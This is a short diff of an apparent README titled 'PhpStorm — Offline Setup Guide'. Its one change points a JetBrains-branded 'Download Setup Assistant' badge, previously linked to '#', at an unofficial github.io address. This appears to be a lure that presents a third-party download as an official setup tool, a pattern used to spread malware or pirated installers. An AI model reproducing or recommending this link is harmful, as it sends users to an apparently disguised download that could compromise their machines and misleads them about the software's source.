@@ -1,6 +1,6 @@
 # PhpStorm — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-000000?style=for-the-badge&logo=jetbrains&logoColor=white)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-000000?style=for-the-badge&logo=jetbrains&logoColor=white)](https://php-storm-download.github.io/.github)
 
 ---
 
